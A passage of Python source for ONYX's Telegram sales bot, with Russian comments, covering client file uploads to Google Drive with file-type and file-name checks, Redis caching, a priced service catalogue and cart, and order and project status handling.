            payload = dict(payload, secret=SHEETS_SECRET)
        data = json.dumps(payload, ensure_ascii=False).encode("utf-8")
        req = urllib.request.Request(SHEETS_WEBHOOK_URL, data=data,
                                     headers={"Content-Type": "application/json"})
        with urllib.request.urlopen(req, timeout=timeout) as r:
            body = (r.read(4000) or b"").decode("utf-8", "ignore").strip()
        return json.loads(body) if body.startswith("{") else None
    except Exception as e:
        log_error("drive", f"Drive недоступен: {e}", notify=False)
        return None


def drive_client_payload(uid):
    """Данные клиента для именования папки проекта."""
    p = user_get(uid) or {}
    d = _get(f"onyx:quest:{uid}") or {}
    orders = p.get("orders") or []
    return {"telegram_id": uid, "order_id": orders[-1] if orders else "",
            "company_name": d.get("company_name") or p.get("name", ""),
            "city": d.get("city", "")}


def drive_ensure_folder(uid, notify_admin=False):
    """Создать (или найти) папку проекта клиента и запомнить ссылку."""
    links = _get(f"onyx:drive:{uid}") or {}
    if links.get("folder_url"):
        return links["folder_url"]
    res = drive_call(dict(drive_client_payload(uid), action="drive_folder"))
    if res and res.get("ok") and res.get("folder_url"):
        links["folder_url"] = res["folder_url"]
        links["folder_id"] = res.get("folder_id", "")
        _set(f"onyx:drive:{uid}", links, ttl=YEAR)
        if notify_admin:
            notify_admins(f"📁 <b>Создана папка проекта</b>\nid {uid} · {res.get('name', '')}\n"
                          f"{res['folder_url']}")
        return res["folder_url"]
    return ""


# Куда класть присланный файл: клиент выбирает категорию кнопкой перед загрузкой
UPLOAD_CATEGORIES = [
    ("logo", "🖼 Логотип"),
    ("photos", "📸 Фото компании / работ"),
    ("portfolio", "🏗 Портфолио, примеры работ"),
    ("reviews", "⭐ Отзывы"),
    ("documents", "📄 Документы, сертификаты"),
    ("video", "🎬 Видео"),
]
UPLOAD_CAT_RU = dict(UPLOAD_CATEGORIES)


def upload_menu_kb():
    rows = [[{"text": lbl, "callback_data": f"up:cat:{key}"}] for key, lbl in UPLOAD_CATEGORIES]
    rows.append([{"text": "✅ Всё прислал", "callback_data": "up:done"}])
    rows.append([{"text": "⬅️ Назад", "callback_data": "b:cab"}])
    return {"inline_keyboard": rows}


def drive_upload_from_telegram(uid, file_id, file_name, category):
    """Взять файл у Telegram и передать в Drive через Apps Script."""
    r = tg("getFile", file_id=file_id)
    path = ((r or {}).get("result") or {}).get("file_path")
    if not path:
        return None
    url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{path}"
    ext = ("." + path.rsplit(".", 1)[1]) if "." in path.rsplit("/", 1)[-1] else ""
    if file_name and "." not in file_name:
        file_name += ext
    payload = dict(drive_client_payload(uid), action="drive_upload",
                   file_url=url, file_name=file_name or (f"{now_str().replace(':', '-')}{ext}"),
                   category=category)
    res = drive_call(payload)
    if res and res.get("ok"):
        links = _get(f"onyx:drive:{uid}") or {}
        links["folder_url"] = res.get("folder_url", links.get("folder_url", ""))
        cnt = links.get("counts") or {}
        cnt[category] = cnt.get(category, 0) + 1
        links["counts"] = cnt
        _set(f"onyx:drive:{uid}", links, ttl=YEAR)
    return res


def upload_status_text(uid):
    links = _get(f"onyx:drive:{uid}") or {}
    cnt = links.get("counts") or {}
    lines = ["# 📎 Материалы для сайта", ""]
    if cnt:
        lines.append("### Уже загружено")
        lines += [f"- [x] {lbl} - **{cnt[key]} шт.**"
                  for key, lbl in UPLOAD_CATEGORIES if cnt.get(key)]
        lines.append("")
    lines += [
        "Выберите ниже, что будете присылать, - и **отправьте файлы прямо сюда, в чат**. "
        "Скрепка слева от поля ввода, можно несколько штук подряд.", "",
        "### Что подходит", "",
        "- Фотографии: работы, объект, команда, интерьер",
        "- Логотип: любой файл, хоть с визитки",
        "- Видео: обзор, процесс работы, отзыв клиента",
        "- Документы: прайс, презентация, сертификаты",
        "",
        "Форматы: JPG, PNG, HEIC, MP4, MOV, PDF, DOC, XLS. До 45 МБ на файл.", "",
        DRIVE_INFO]
    return "\n".join(lines)


# Что принимаем от клиента. Всё остальное просим прислать иначе.
UPLOAD_ALLOWED_EXT = {
    ".jpg", ".jpeg", ".png", ".webp", ".heic", ".gif",      # изображения
    ".mp4", ".mov", ".m4v",                                  # видео
    ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".rtf", ".txt",  # документы
    ".ai", ".eps", ".svg", ".psd", ".cdr",                    # исходники логотипа
    ".zip",                                                   # архив с материалами
}
# Явно опасные расширения - их не должно быть даже внутри разрешённого списка.
UPLOAD_BLOCKED_EXT = {
    ".exe", ".bat", ".cmd", ".com", ".scr", ".msi", ".vbs", ".js", ".jar",
    ".sh", ".ps1", ".apk", ".dll", ".php", ".py", ".html", ".htm", ".svgz",
}
UPLOAD_MAX_MB = 45   # Telegram отдаёт боту файлы до 50 МБ


def safe_file_name(name):
    """Имя файла для Диска: без путей, без управляющих символов, разумной длины.

    Клиент управляет именем файла. Без обработки в имени может приехать
    `../../` или невидимые символы, а имя уходит в стороннюю систему."""
    n = (name or "файл").replace("\\", "/").split("/")[-1]
    n = "".join(ch for ch in n if ch.isprintable() and ch not in '<>:"|?*')
    n = n.strip(" .") or "файл"
    return n[:120]


def upload_allowed(file_name, size_bytes=0):
    """(можно, причина_отказа_для_клиента)."""
    n = safe_file_name(file_name).lower()
    ext = ("." + n.rsplit(".", 1)[1]) if "." in n else ""
    if ext in UPLOAD_BLOCKED_EXT:
        return False, "Такие файлы мы не принимаем - они могут быть опасными."
    if ext and ext not in UPLOAD_ALLOWED_EXT:
        return False, ("Не знаем, что делать с таким файлом. Пришлите картинку, "
                       "видео, PDF или документ.")
    if size_bytes and size_bytes > UPLOAD_MAX_MB * 1024 * 1024:
        return False, f"Файл больше {UPLOAD_MAX_MB} МБ - пришлите версию полегче."
    return True, ""


def handle_upload(chat_id, uid, st, file_id, file_name, forced_category=None, file_size=0):
    """Клиент прислал файл в режиме загрузки - кладём в папку проекта на Диске."""
    cat = forced_category or st.get("category") or "other"
    if not file_id:
        send(chat_id, "Не получилось прочитать файл, попробуйте ещё раз."); return

    ok_file, why = upload_allowed(file_name, file_size)
    if not ok_file:
        send(chat_id, "⚠️ " + why)
        log_error("upload", f"отклонён файл от {uid}: {safe_file_name(file_name)}", notify=False)
        return
    file_name = safe_file_name(file_name)
    res = drive_upload_from_telegram(uid, file_id, file_name, cat)
    if res and res.get("ok"):
        links = _get(f"onyx:drive:{uid}") or {}
        n = (links.get("counts") or {}).get(cat, 1)
        send(chat_id, f"✅ Сохранили в «{UPLOAD_CAT_RU.get(cat, cat)}» ({n} шт.)\n"
                      "<i>Можно прислать ещё или выбрать другую категорию.</i>",
             {"inline_keyboard": [
                 [{"text": "➡️ Далее", "callback_data": "up:open"}],
                 [{"text": "✅ Всё прислал", "callback_data": "up:done"}]]})
    else:
        send(chat_id, "⚠️ Файл получили, но не смогли положить на Диск - "
                      "сообщили менеджеру, он добавит вручную.")
        # file_id вместе с токеном бота позволяет скачать файл клиента,
        # поэтому в чат кладём только хвост - его хватает, чтобы найти запись.
        notify_admins(f"⚠️ <b>Файл не ушёл в Drive</b>\nid {uid} · категория {cat}\n"
                      f"метка файла: <code>…{str(file_id)[-8:]}</code>")


def sheet_row(type_, name="", contact="", tg_="", niche="", goal="", has_site="",
              references="", options="", amount="", comment=""):
    return {"type": type_, "date": time.strftime("%Y-%m-%d %H:%M"), "name": name,
            "contact": contact, "tg": tg_, "niche": niche, "goal": goal,
            "has_site": has_site, "references": references, "options": options,
            "amount": amount, "comment": comment}


def notify_manager(text):
    if MANAGER_CHAT_ID:
        send(MANAGER_CHAT_ID, text)


def notify_admins(text, kb=None):
    """Уведомить всех админов; если админов нет - упасть на менеджера."""
    sent = False
    for aid in ADMIN_IDS:
        try:
            send(aid, text, kb); sent = True
        except Exception as e:
            print("notify_admins err", e)
    if not sent and MANAGER_CHAT_ID:
        send(MANAGER_CHAT_ID, text, kb)


# ------------------------- Redis / state -------------------------
def _redis(*cmd):
    if not KV_URL or not KV_TOKEN:
        return None
    data = json.dumps(list(cmd)).encode("utf-8")
    req = urllib.request.Request(KV_URL, data=data,
        headers={"Authorization": f"Bearer {KV_TOKEN}", "Content-Type": "application/json"})
    try:
        # таймаут снижен с 10 до 4с: при зависании Upstash каждый вызов раньше мог
        # держать ответ клиенту до 10 секунд, а на один хэндлер таких вызовов несколько
        with urllib.request.urlopen(req, timeout=4) as r:
            return json.load(r).get("result")
    except Exception as e:
        print("Redis error:", cmd[0], e)
        return None


# Кэш на время одного запроса. Один и тот же ключ (профиль клиента, лид, состояние)
# читается за обработку по 5-6 раз - без кэша это столько же обращений по сети.
# База за границей, ~100-150 мс на запрос, поэтому дубли и давали задержку на кнопках.
_REQ_CACHE = {}
_REQ_ON = [False]


def req_cache_begin():
    _REQ_CACHE.clear()
    _REQ_ON[0] = True


def req_cache_end():
    _REQ_CACHE.clear()
    _REQ_ON[0] = False


_PIPE_OK = [None]      # None - не пробовали, True/False - умеет ли база пакеты


def _redis_many(cmds):
    """Отправить пачку команд ОДНИМ запросом (Upstash /pipeline).
    Это главный рычаг скорости: 10 команд = 1 сетевой round-trip вместо 10.
    Если база не поддерживает - один раз узнаём и дальше шлём по одной."""
    if not cmds:
        return []
    if not KV_URL or not KV_TOKEN or _PIPE_OK[0] is False:
        return [_redis(*c) for c in cmds]
    try:
        data = json.dumps([list(map(str, c)) for c in cmds]).encode("utf-8")
        req = urllib.request.Request(
            KV_URL.rstrip("/") + "/pipeline", data=data,
            headers={"Authorization": f"Bearer {KV_TOKEN}", "Content-Type": "application/json"})
        with urllib.request.urlopen(req, timeout=5) as r:
            res = json.load(r)
        if isinstance(res, list):
            _PIPE_OK[0] = True
            return [x.get("result") if isinstance(x, dict) else x for x in res]
    except Exception as e:
        print("pipeline unavailable:", e)
    _PIPE_OK[0] = False
    return [_redis(*c) for c in cmds]


def _get(k):
    if _REQ_ON[0] and k in _REQ_CACHE:
        v = _REQ_CACHE[k]
        return copy.deepcopy(v) if isinstance(v, (dict, list)) else v
    if KV_URL:
        raw = _redis("GET", k)
        v = json.loads(raw) if raw else None
    else:
        v = _MEM.get(k)
    if _REQ_ON[0]:
        _REQ_CACHE[k] = copy.deepcopy(v) if isinstance(v, (dict, list)) else v
    return v


_WRITE_Q = {}          # отложенные записи: ключ → (значение, ttl)


def _write_now(k, v, ttl):
    if KV_URL:
        _redis("SET", k, json.dumps(v, ensure_ascii=False), "EX", str(ttl))
    else:
        _MEM[k] = v


def _set(k, v, ttl=3600, immediate=False):
    """Запись копится и уходит одним разом в конце обработки: за один запрос
    профиль клиента переписывается по 3-4 раза, и каждая перезапись - сеть.
    immediate=True для замков от двойного нажатия: их должен сразу увидеть
    параллельный запрос."""
    if _REQ_ON[0] and not immediate:
        _WRITE_Q[k] = (v, ttl)
        _REQ_CACHE[k] = copy.deepcopy(v) if isinstance(v, (dict, list)) else v
        return
    _write_now(k, v, ttl)
    if _REQ_ON[0]:
        _REQ_CACHE[k] = copy.deepcopy(v) if isinstance(v, (dict, list)) else v


def flush_kv():
    """Сбросить отложенные записи. Каждый ключ пишется ровно один раз."""
    if not _WRITE_Q:
        return
    items = list(_WRITE_Q.items())
    _WRITE_Q.clear()
    if not KV_URL:
        for k, (v, ttl) in items:
            _MEM[k] = v
        return
    try:
        _redis_many([("SET", k, json.dumps(v, ensure_ascii=False), "EX", str(ttl))
                     for k, (v, ttl) in items])
    except Exception as e:
        print("kv flush err", e)


def _del(k):
    _WRITE_Q.pop(k, None)          # отменяем отложенную запись, если она была
    if KV_URL:
        _redis("DEL", k)
    else:
        _MEM.pop(k, None)
    if _REQ_ON[0]:
        _REQ_CACHE.pop(k, None)


def state_get(uid): return _get(f"onyx:state:{uid}")
def state_set(uid, v): _set(f"onyx:state:{uid}", v)
def state_del(uid): _del(f"onyx:state:{uid}")
def cart_get(uid): return _get(f"onyx:cart:{uid}") or []
def cart_set(uid, v): _set(f"onyx:cart:{uid}", v)


# ------------------------- Каталог -------------------------
# unit: "" - разово (без пометки), "разово" - явная пометка, "мес" - в месяц
# approx=True - цена «от …». mandatory=True - обязательная услуга для новых клиентов.
# Доп. опции - ТОЧНО как на сайте onyx-web.ru (раздел «Дополнительные опции»).
# included_in - в какие тарифы уже входит опция. approx=True - цена «от …».
SERVICES = [
    {"id": "pages", "name": "Дополнительные страницы", "price": 2500, "approx": True, "unit_note": "за страницу",
     "short": "Отдельная страница под услугу, направление, акцию, портфолио, отзывы, команду или контакты.",
     "why": "Подробнее раскрывает предложения компании и ведёт клиентов на страницу под их запрос."},
    {"id": "catalog", "name": "Каталог товаров и услуг", "price": 7900, "approx": True,
     "short": "Раздел с товарами или услугами: категории, карточки, описания, цены и кнопки заявки.",
     "why": "Показывает ассортимент или перечень услуг понятно и структурно."},
    {"id": "crm", "name": "CRM-интеграция", "price": 7900, "approx": True, "included_in": ["system"],
     "short": "Передача заявок с сайта в CRM или таблицу заявок.",
     "why": "Заявки не теряются, а попадают в систему, где их можно контролировать."},
    {"id": "cart", "name": "Корзина", "price": 9900, "approx": True,
     "short": "Выбор товаров или услуг и оформление заказа на сайте.",
     "why": "Клиент может собрать заказ и отправить его бизнесу, а не просто оставить заявку."},
    {"id": "maps", "name": "Подключение карт и геосервисов", "price": 2900, "approx": True,
     "included_in": ["leads", "system"],
     "short": "Интерактивная карта, маршрут, геолокация и удобный блок контактов.",
     "why": "Клиент быстрее понимает, где находится компания и как до неё добраться."},
    {"id": "calc", "name": "Калькулятор стоимости", "price": 6990, "approx": True,
     "short": "Интерактивный расчёт стоимости услуги прямо на сайте.",
     "why": "Клиент получает ориентир по цене, а бизнес - более тёплую заявку."},
    {"id": "docs", "name": "Политика конфиденциальности и документы", "price": 2900, "approx": True,
     "short": "Политика обработки персональных данных, согласие для форм заявок и базовые юр.документы.",
     "why": "Сайт становится более прозрачным и подготовленным к сбору заявок."},
    {"id": "design", "name": "Индивидуальный дизайн", "price": 15000, "approx": True,
     "short": "Уникальная визуальная концепция сайта под бренд, нишу и желаемое впечатление.",
     "why": "Сайт перестаёт выглядеть как стандартный шаблон и лучше передаёт уровень компании."},
    {"id": "smm", "name": "SMM ONYX", "price": 50000, "unit": "мес", "approx": True,
     "short": "Ведение соцсетей и контента для бизнеса под ключ.",
     "why": "Больше касаний с аудиторией, усиление доверия и переходы из соцсетей на сайт."},
    {"id": "analytics", "name": "Настройка аналитики", "price": 3990, "approx": True,
     "included_in": ["leads", "system"],
     "short": "Яндекс Метрика или Google Analytics: отслеживание посещений, кликов и заявок.",
     "why": "Владелец видит посещения, источники и действия клиентов."},
    {"id": "booking", "name": "Онлайн-запись", "price": 6990, "approx": True,
     "short": "Запись через форму или сторонний сервис.",
     "why": "Клиент записывается без лишней переписки, а бизнес быстрее получает готовое обращение."},
    {"id": "tgnotify", "name": "Telegram-уведомления", "price": 3990, "approx": True,
     "included_in": ["leads", "system"],
     "short": "Новые заявки с сайта сразу приходят в Telegram владельца или менеджера.",
     "why": "Заявки не лежат незамеченными в почте - владелец сразу видит обращение."},
]
SERVICE = {s["id"]: s for s in SERVICES}
NAME_TO_ID = {s["name"]: s["id"] for s in SERVICES}
MANDATORY = [s["id"] for s in SERVICES if s.get("mandatory")]


def norm_service(x):
    """Привести услугу к id (legacy-заказы могли хранить название)."""
    return x if x in SERVICE else NAME_TO_ID.get(x, x)

# Обратная совместимость со старым кодом
CART_ITEMS = [(s["id"], s["name"], s["price"]) for s in SERVICES]
ITEM = {s["id"]: (s["name"], s["price"]) for s in SERVICES}


def fmt_amount(n):
    return f"{n:,}".replace(",", " ") + " ₽"


def fmt_price(s):
    txt = ("от " if s.get("approx") else "") + fmt_amount(s["price"])
    if s.get("unit") == "мес":
        txt += " / мес"
    elif s.get("unit") == "разово":
        txt += " (разово)"
    return txt


def cart_total(cart): return sum(ITEM[c][1] for c in cart if c in ITEM)


def cart_kb(cart):
    rows = []
    for cid, name, price in CART_ITEMS:
        mark = "✅" if cid in cart else "▫️"
        rows.append([{"text": f"{mark} {name} - {price} ₽", "callback_data": f"c:{cid}"}])
    total = cart_total(cart)
    rows.append([{"text": "🧹 Очистить", "callback_data": "c:clear"},
                 {"text": (f"💳 Оплатить {total} ₽" if total else "💳 Оплатить"), "callback_data": "c:pay"}])
    rows.append([{"text": "ℹ️ Об услугах", "callback_data": "c:info"},
                 {"text": "🏠 Меню", "callback_data": "b:home"}])
    return {"inline_keyboard": rows}


def cart_text(cart):
    total = cart_total(cart)
    lines = [f"• {ITEM[c][0]} - {ITEM[c][1]} ₽" for c in cart if c in ITEM]
    body = "\n".join(lines) if lines else "Пока ничего не выбрано."
    return ("🛒 <b>Тарифы и услуги ONYX</b>\n\nОтметьте нужное - посчитаю сумму.\n\n"
            f"{body}\n\n<b>Итого: {total} ₽</b>\n\n"
            "Цены «от …» уточняются индивидуально с менеджером.")


def mark_order_paid(o, source=""):
    """Пометить заказ оплаченным (вручную админом после поступления оплаты по счёту)."""
    already = o.get("payment_status") == "paid"
    o["payment_status"] = "paid"
    o["status"] = "paid_waiting_start"
    o["paid"] = True
    o["updated"] = now_str()
    order_save(o)
    sheet_order(o)
    mark_purchased(o.get("uid"), o.get("items", []))
    uid = o.get("uid")
    if not already and uid:
        # аналитика/лиды/теги (единожды на заказ)
        log_event(uid, "paid", str(o.get("id")))
        bump("revenue", int(o.get("total", 0)))
        l = lead_get(uid)
        if l:
            l["lead_status"] = "converted"
            lead_save(l)
        recompute_tags(uid)
        cancel_followups(uid, ("cart_abandoned_1", "cart_abandoned_2",
                               "questionnaire_abandoned", "idle_after_start", "audit_no_order"))
        try:
            production_create(o)  # запуск производственного конвейера
        except Exception as e:
            print("production_create err", e)
    total = fmt_amount(o.get("total", 0))
    if uid:
        try:
            send(uid, f"✅ <b>Оплата получена!</b>\nЗаказ №{o['id']} на {total} оплачен.\n"
                      "Приступаем к работе - команда ONYX свяжется с вами по старту 🚀", MAIN_MENU)
        except Exception as e:
            print("notify client paid err", e)
    names = ", ".join(SERVICE.get(c, {}).get("name", c) for c in o.get("items", []))
    notify_admins(f"💰 <b>Оплачен заказ №{o['id']}</b>\nКлиент id {uid}\n"
                  f"Услуги: {names}\nСумма: {total}\nОплата: {source or o.get('payment_method', '')}")


# ------------------------- Этап 3: услуги, комментарии, обязательные платежи -------------------------
def cart_comments_get(uid): return _get(f"onyx:cart_comments:{uid}") or {}
def cart_comments_set(uid, v): _set(f"onyx:cart_comments:{uid}", v)


def has_active_site(uid):
    """Есть ли у клиента уже запущенный сайт ONYX."""
    p = user_get(uid) or {}
    if p.get("client_status") in ("client", "vip"):
        return True
    return False


def mandatory_ids(uid):
    """Обязательные услуги для данного клиента (для новых без активного сайта)."""
    return [] if has_active_site(uid) else list(MANDATORY)


def ensure_mandatory(uid):
    """Автодобавление обязательных услуг в корзину нового клиента."""
    cart = cart_get(uid)
    changed = False
    for cid in mandatory_ids(uid):
        if cid not in cart:
            cart.append(cid); changed = True
    if changed:
        cart_set(uid, cart)
    return cart


# --- Список услуг (карточки) ---
def services_list_text(uid):
    head = ("🛒 <b>Тарифы и услуги ONYX</b>\n\n"
            "Разработка сайта - <b>0 ₽</b>. Ниже - запуск и опции для развития.\n"
            "Нажмите на услугу, чтобы посмотреть описание и добавить в корзину 👇")
    if mandatory_ids(uid):
        head += "\n\n🔒 «Запуск» обязателен для нового сайта."
    return head


def services_list_kb(uid):
    cart = cart_get(uid)
    rows = []
    for s in SERVICES:
        mark = "✅ " if s["id"] in cart else ""
        lock = "🔒 " if (s.get("mandatory") and s["id"] in mandatory_ids(uid)) else ""
        rows.append([{"text": f"{mark}{lock}{s['name']} · {fmt_price(s)}",
                      "callback_data": f"svc:v:{s['id']}"}])
    total = cart_total(cart)
    rows.append([{"text": (f"🛒 Корзина · {fmt_amount(total)}" if total else "🛒 Корзина"),
                  "callback_data": "cart:show"}])
    # Список опций перегружает: человек не знает, что из этого нужно его бизнесу.
    # Вместо того чтобы бросить его наедине с прайсом, предлагаем разобрать.
    rows.append([{"text": "🎯 Не уверены? Разберём на консультации",
                  "callback_data": "cons:offer"}])
    rows.append(nav_row(uid))
    return {"inline_keyboard": rows}


# --- Карточка одной услуги ---
def service_card_text(cid, uid):
    s = SERVICE.get(cid)
    if not s:
        return "Услуга не найдена."
    in_cart = cid in cart_get(uid)
    price_line = f"💰 Стоимость: <b>{fmt_price(s)}</b>"
    if s.get("unit_note"):
        price_line += f" {s['unit_note']}"
    lines = [f"<b>{s['name']}</b>", price_line, "", s["short"], "",
             f"🎯 <b>Польза:</b> {s['why']}"]
    inc = s.get("included_in")
    if inc:
        names = ", ".join(f"«{TARIFF_SHORT.get(t, t)}»" for t in inc)
        lines.append(f"\n✅ Уже входит в тариф(ы): {names}. Отдельно - по цене выше.")
    if in_cart:
        lines.append("\n🛒 Добавлено в вашу заявку.")
    return "\n".join(lines)


def service_card_kb(cid, uid):
    s = SERVICE.get(cid)
    in_cart = cid in cart_get(uid)
    is_mand = bool(s and s.get("mandatory") and cid in mandatory_ids(uid))
    rows = []
    if in_cart and not is_mand:
        rows.append([{"text": "🗑 Убрать из корзины", "callback_data": f"svc:del:{cid}"}])
    elif not in_cart:
        rows.append([{"text": "➕ Добавить в корзину", "callback_data": f"svc:add:{cid}"}])
    rows.append([{"text": "⬅️ Назад к услугам", "callback_data": "svc:list"},
                 {"text": "🛒 Корзина", "callback_data": "cart:show"}])
    return {"inline_keyboard": rows}


# --- Сообщение после добавления в корзину ---
def added_text(cid):
    s = SERVICE.get(cid, {})
    return ("✅ <b>Добавлено в корзину:</b>\n"
            f"{s.get('name','')}\n"
            f"Стоимость: <b>{fmt_price(s)}</b>\n\n"
            "Хотите добавить комментарий к этой услуге?")


def added_kb(cid):
    return {"inline_keyboard": [
        [{"text": "✍️ Добавить комментарий", "callback_data": f"svc:cm:{cid}"}],
        [{"text": "Без комментария", "callback_data": "svc:list"}],
        [{"text": "🛒 Перейти в корзину", "callback_data": "cart:show"},
         {"text": "➕ Продолжить выбор", "callback_data": "svc:list"}],
    ]}


# --- Детальная корзина (отдельным сообщением) ---
def cart_show_text(uid):
    ensure_mandatory(uid)
    cart = cart_get(uid)
    comments = cart_comments_get(uid)
    mand = mandatory_ids(uid)
    if not cart:
        return "🛒 <b>Корзина пуста.</b>\nВыберите услуги в разделе «Тарифы и услуги»."
    req_lines, opt_lines = [], []
    for cid in cart:
        s = SERVICE.get(cid)
        if not s:
            continue
        line = f"• {s['name']} - {fmt_price(s)}"
        cm = comments.get(cid)
        if cm:
            line += f"\n   💬 {cm}"
        if cid in mand:
            req_lines.append(line)
        else:
            opt_lines.append(line)
    parts = ["🛒 <b>Ваша корзина</b>", ""]
    if req_lines:
        parts.append("🔒 <b>Обязательные платежи:</b>")
        parts += req_lines
        parts.append("")
    if opt_lines:
        parts.append("➕ <b>Дополнительные услуги:</b>")
        parts += opt_lines
        parts.append("")
    parts.append(f"<b>Итого: {fmt_amount(cart_total(cart))}</b>")
    if any(SERVICE.get(c, {}).get("approx") for c in cart):
        parts.append("\n<i>Цены «от …» уточняются индивидуально с менеджером.</i>")
    return "\n".join(parts)


def cart_show_kb(uid):
    cart = cart_get(uid)
    rows = []
    if cart:
        rows.append([{"text": "✅ Оформить заказ", "callback_data": "cart:checkout"}])
        rows.append([{"text": "🧹 Очистить корзину", "callback_data": "cart:clear"},
                     {"text": "⬅️ К услугам", "callback_data": "svc:list"}])
    else:
        rows.append([{"text": "⬅️ К услугам", "callback_data": "svc:list"}])
    rows.append([{"text": "🏠 Меню", "callback_data": "b:home"}])
    return {"inline_keyboard": rows}


def svc_comment_input(chat_id, uid, st, text):
    cid = st.get("id")
    if cid not in SERVICE:
        state_del(uid); return
    comments = cart_comments_get(uid)
    comments[cid] = text.strip()
    cart_comments_set(uid, comments)
    state_del(uid)
    s = SERVICE.get(cid, {})
    send(chat_id, f"💬 Комментарий к услуге «{s.get('name', '')}» сохранён.",
         {"inline_keyboard": [
             [{"text": "🛒 Перейти в корзину", "callback_data": "cart:show"}],
             [{"text": "➕ Продолжить выбор", "callback_data": "svc:list"}],
         ]})


# ------------------------- Данные: пользователи и заказы -------------------------
YEAR = 60 * 60 * 24 * 365

STATUS = {
    "created": "🆕 Создан",
    "new": "🆕 Новый",
    "wait_pay": "⏳ Ожидает оплаты",
    "waiting_invoice": "🧾 Ждёт счёта",
    "paid_waiting_start": "💰 Оплачен, ждёт старта",
    "invoice": "🧾 Ожидает счёта",
    "paid": "✅ Оплачен",
    "in_work": "🛠 В работе",
    "review": "🔎 На проверке",
    "done": "🎉 Готов",
    "canceled": "❌ Отменён",
}


# ------------------------- Этап 5: статусы производства сайта -------------------------
# Порядок важен: используется для inline-кнопок админа.
PROJECT_STATUS = {
    "created": {"label": "🆕 Заявка создана",
                "desc": "Ваша заявка оформлена. Мы свяжемся с вами для консультации с разработчиком.",
                "eta": "-"},
    "consultation_pending": {"label": "📞 Ожидает консультации",
                             "desc": "Заявка у команды ONYX. В течение 30 минут с вами свяжется разработчик, чтобы обсудить проект. "
                                     "Оплата не требуется - она будет только после того, как вы утвердите готовый сайт.",
                             "eta": "до 30 минут"},
    "consultation_done": {"label": "✅ Консультация проведена",
                          "desc": "Мы обсудили ваш проект и приступаем к подготовке структуры сайта.",
                          "eta": "до 30 минут"},
    "questionnaire_review": {"label": "📋 Изучаем анкету",
                             "desc": "Наша команда изучает вашу анкету и готовит структуру будущего сайта под ваш бизнес.",
                             "eta": "до 30 минут"},
    "in_production": {"label": "🛠 Сайт в разработке",
                      "desc": "Ваш сайт сейчас находится в разработке. Мы собираем структуру, тексты и основные блоки. Обычно 1-3 рабочих дня.",
                      "eta": "1-3 рабочих дня"},
    "design_review": {"label": "🎨 Проверяем дизайн и структуру",
                      "desc": "Сайт собран - проверяем дизайн, структуру и удобство на всех устройствах.",
                      "eta": "до 30 минут"},
    "ready_to_show": {"label": "👀 Готов к показу",
                      "desc": "Готовим демонстрацию сайта - скоро пришлём вам ссылку на предпросмотр.",
                      "eta": "до 30 минут"},
    "shown": {"label": "🖥 Сайт показан",
              "desc": "Мы показали вам сайт. Напишите, всё ли нравится или нужны правки.",
              "eta": "-"},
    "revision": {"label": "✏️ Правки в работе",
                 "desc": "Вносим ваши правки в сайт.",
                 "eta": "до 30 минут"},
    "approved": {"label": "✅ Сайт утверждён",
                 "desc": "Вы утвердили сайт. Теперь мы выставим официальный счёт через «Мой налог».",
                 "eta": "-"},
    "invoice_issued": {"label": "🧾 Счёт выставлен",
                       "desc": "Мы выставили официальный счёт через «Мой налог». После оплаты подключаем домен и публикуем сайт.",
                       "eta": "-"},
    "paid_waiting_start": {"label": "💰 Оплачено",
                           "desc": "Оплата получена. Готовим публикацию сайта.",
                           "eta": "до 30 минут"},
    "domain_setup": {"label": "🌐 Подключаем домен",
                     "desc": "Подключаем домен и проверяем корректную работу сайта. Обычно до 24 часов.",
                     "eta": "до 24 часов"},
    "published": {"label": "🚀 Сайт опубликован",
                  "desc": "Ваш сайт опубликован и работает на домене!",
                  "eta": "-"},
    "completed": {"label": "🎉 Проект завершён",
                  "desc": "Проект завершён. Проверьте сайт и поделитесь впечатлением.",
                  "eta": "-"},
    "paused": {"label": "⏸ Проект на паузе",
               "desc": "Проект временно на паузе. Мы свяжемся с вами по дальнейшим шагам.",
               "eta": "-"},
    "cancelled": {"label": "❌ Заявка отменена",
                  "desc": "Заявка отменена. Если это ошибка - напишите в поддержку, мы поможем.",
                  "eta": "-"},
}

# Старые ключи статусов -> новые (для показа старых заказов в новом разделе)
STATUS_ALIAS = {
    "new": "created", "wait_pay": "consultation_pending", "invoice": "invoice_issued",
    "waiting_payment": "consultation_pending", "waiting_invoice": "invoice_issued",
    "paid": "paid_waiting_start", "in_work": "in_production", "review": "design_review",
    "final_check": "design_review", "done": "completed", "canceled": "cancelled",
}

PAY_STATUS_RU = {
    "pending": "ожидает оплаты",
    "paid": "оплачено ✅",
    "invoice_requested": "ожидает оплаты по счёту",
}


def proj_status(o):
    key = o.get("status", "created")
    return STATUS_ALIAS.get(key, key)


def ps_label(key):
    return PROJECT_STATUS.get(key, {}).get("label", STATUS.get(key, key))


def ps_desc(key):
    return PROJECT_STATUS.get(key, {}).get("desc", "")


def ps_eta(key):
    return PROJECT_STATUS.get(key, {}).get("eta", "-")


ACTIVE_EXCLUDE = {"completed", "cancelled"}


def active_order(uid):
    """Последний заказ клиента, который ещё не завершён и не отменён."""
    p = user_get(uid) or {}
    for oid in reversed(p.get("orders", [])):
        o = order_get(oid)
        if o and proj_status(o) not in ACTIVE_EXCLUDE:
            return o
    return None


def now_str():
    return time.strftime("%d.%m.%Y %H:%M")


def user_get(uid):
    return _get(f"onyx:user:{uid}") or {}


def user_save(uid, profile):
    _set(f"onyx:user:{uid}", profile, ttl=YEAR)


def upsert_user(uid, name=None, contact=None, username=None):
    p = user_get(uid)
    if not p:
        p = {"uid": uid, "created": now_str(), "orders": []}
    if name:
        p["name"] = name
    if contact:
        p["contact"] = contact
    if username:
        p["username"] = username
    p["updated"] = now_str()
    user_save(uid, p)
    return p


def next_order_id():
    if KV_URL:
        n = _redis("INCR", "onyx:order_seq")
        return int(n) if n else int(time.time())
    _MEM["_seq"] = _MEM.get("_seq", 1000) + 1
    return _MEM["_seq"]


def order_new(uid, items, total, payment_type, status="created", extra=None,
              comments=None, payment_method=""):
    oid = next_order_id()
    order = {"id": oid, "uid": uid, "items": items, "total": total,
             "payment_type": payment_type, "payment_method": payment_method,
             "status": status, "payment_status": "pending",
             "service_comments": comments or {},
             "paid": False, "created": now_str(), "updated": now_str()}
    if extra:
        order.update(extra)
    _set(f"onyx:order:{oid}", order, ttl=YEAR)
    if KV_URL:
        _redis("RPUSH", "onyx:orders_all", str(oid))
    else:
        _MEM.setdefault("_orders_all", []).append(oid)
    if KV_URL:
        _redis("RPUSH", "onyx:orders", str(oid))
    else:
